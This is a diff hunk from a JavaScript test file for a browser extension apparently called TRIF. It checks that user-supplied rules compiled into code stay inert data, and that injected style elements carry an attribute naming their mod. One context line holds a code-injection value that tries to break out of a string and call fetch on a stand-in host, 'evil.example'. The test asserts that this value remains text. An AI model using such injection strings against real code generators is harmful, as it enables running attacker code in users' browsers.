@@ -52,6 +52,11 @@ test('rules: the code is TRIF\'s, with the rules as data, and it compiles', () =
   const sneaky = rules.rulesCode(ok({ replace: [{ find: 'a', with: '"); fetch("https://evil.example"); ("' }] }), 'x.com/b');
   assert.doesNotThrow(() => new vm.Script(sneaky));
   assert.equal(sneaky.split('fetch(').length, 2, 'only inside the data, as text');
+  // its style element says whose it is (the clickjacking guard names the mod: extension/runtime.js clickGuard)
+  const els = [];
+  const document = { documentElement: {}, head: { append(e) { els.push(e); } }, createElement: () => ({ attrs: {}, setAttribute(k, v) { this.attrs[k] = v; } }), addEventListener() {} };
+  vm.runInNewContext(code, { document });
+  assert.deepEqual(els.map((e) => e.attrs['data-trif-style']), ['x.com/a']);
 });
 
 function makeWs() {
